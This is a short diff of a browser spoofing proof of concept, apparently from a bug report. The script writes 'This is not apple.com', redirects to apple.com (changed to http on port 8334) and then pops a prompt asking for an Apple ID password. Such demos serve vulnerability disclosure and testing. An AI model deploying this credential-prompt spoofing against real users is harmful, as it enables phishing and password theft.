@@ -1,9 +1,9 @@
 <script>
-function spoof(){
+function spoof24(){
 document.write("<h1>This is not apple.com</h1>");
-window.location.assign("https://www.apple.com/");
+window.location.assign("http://www.apple.com:8334/");
 setInterval(spoof24(),2000);
 setTimeout(function(){
 prompt('Checking your appid password:'); },6000); }
 </script>
-<input type="button" value="Run" onclick="spoof()" />
+<input type="button" value="Run" onclick="spoof24()" />
